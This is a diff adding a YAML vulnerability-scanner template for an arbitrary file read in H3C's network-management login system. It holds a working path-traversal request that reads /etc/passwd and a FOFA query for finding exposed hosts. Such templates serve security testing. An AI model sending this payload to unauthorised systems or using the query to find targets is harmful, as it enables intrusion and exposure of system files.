@@ -1,0 +1,22 @@
+id: h3c-jquery-172-file-read
+
+info:
+  name: H3C 用户网管登录系统 jQuery-1.7.2 存在任意文件读取
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    h3c用户网管登录系统jQuery-1.7.2存在任意文件读取漏洞，其1.7.2版本的sys_dia_data_down模块存在任意文件读取漏洞，攻击者可通过前台读取任意文件。
+    fofa: body="webui/js/jquerylib/jquery-1.7.2.min.js"
+  reference:
+    - https://mp.weixin.qq.com/s/PnFzkwH4NZ0FhkKQ73l1IQ
+  created: 2023/05/26
+  tags: cve,cve2023,fileread,h3c
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
